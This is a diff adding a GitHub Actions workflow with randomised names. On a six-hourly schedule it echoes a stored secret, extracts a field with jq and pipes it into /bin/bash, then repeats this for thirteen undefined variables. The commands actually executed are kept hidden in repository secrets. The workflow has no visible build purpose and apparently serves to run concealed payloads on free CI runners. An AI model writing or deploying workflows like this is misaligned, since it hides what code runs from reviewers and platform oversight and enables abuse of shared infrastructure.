@@ -1,0 +1,31 @@
+name: suyanzhn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: suyanzhn
+        env:
+          je66428: ${{ secrets.je66428 }}
+        run: |
+          echo $je66428 | jq -r .mbyvt02 | /bin/bash
+          echo $hhwk27332 | jq -r .lrb794 | /bin/bash
+          echo $n0 | jq -r .tr749 | /bin/bash
+          echo $mda833 | jq -r .n618 | /bin/bash
+          echo $xzvl0366 | jq -r .pzhbl04 | /bin/bash
+          echo $eudnl96 | jq -r .lggk2094 | /bin/bash
+          echo $okjo634 | jq -r .p3 | /bin/bash
+          echo $boq1307 | jq -r .ru896 | /bin/bash
+          echo $asn8027 | jq -r .p8888 | /bin/bash
+          echo $vvya1 | jq -r .oepwz249 | /bin/bash
+          echo $fjpj44 | jq -r .pvyhw8 | /bin/bash
+          echo $rdimu0 | jq -r .bh3 | /bin/bash
+          echo $f243 | jq -r .u98335 | /bin/bash
+          echo $tvcg39818 | jq -r .r6 | /bin/bash
+
